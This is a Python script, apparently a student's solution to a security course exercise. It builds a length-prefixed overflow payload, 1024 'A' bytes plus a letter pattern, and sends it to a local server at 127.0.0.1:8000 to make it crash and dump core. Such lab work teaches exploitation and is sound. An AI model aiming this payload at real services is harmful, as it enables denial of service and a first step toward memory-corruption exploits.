import os
import socket
import struct


HOST = '127.0.0.1'
PORT = 8000

def network(value) -> bytes:
    return struct.pack('>L', value)
def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    list_data = 'A'*1024 + "BBBBBCCCCCDDDDDEEEEEFFFFFGGGGGHHHHHIIIIIJJJJJKKKKKLLLLLMMMMMNNNNNOOOOO"
    list_data = list_data + '0'
    list_data = list_data.encode('latin-1')
    value = len(list_data)
    byte_array = bytearray(4)
    byte_array[0] = (value >> 24) & 0xff
    byte_array[1] = (value >> 16) & 0xff
    byte_array[2] = (value >> 8) & 0xff
    byte_array[3] = value & 0xff
    binary_string = bytes(byte_array)
    return binary_string + list_data


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
